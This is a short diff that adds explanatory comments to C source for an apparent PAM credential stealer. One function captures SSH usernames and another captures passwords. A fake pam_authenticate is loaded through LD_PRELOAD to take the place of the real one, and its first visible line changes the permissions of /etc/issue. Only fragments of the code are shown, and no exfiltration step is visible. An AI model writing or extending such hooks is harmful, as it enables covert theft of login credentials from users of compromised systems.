@@ -9,6 +9,8 @@
 
 typedef int (*pam_authenticate_t)(pam_handle_t *, int);
 
+//this function's role is to retrieve and store the username used to connect to a remote machine with SSH
+
 char *get_username(pam_handle_t *pamh) {
     char *username = NULL;
 
@@ -21,7 +23,7 @@ char *get_username(pam_handle_t *pamh) {
     return username;
 }
 
-
+//this function's role is to retrieve and store the password that the user used to access his machine with SSH
 char *get_password(pam_handle_t *pamh) {
     struct pam_conv *conv;
     
@@ -52,6 +54,7 @@ char *get_password(pam_handle_t *pamh) {
     return NULL;
 }
 
+//this function's role is to impersonate the authentic pam_authenticate function thanks to LD_PRELOAD
 int pam_authenticate(pam_handle_t *pamh, int flags) {
 
     int8_t result = chmod("/etc/issue", 000);
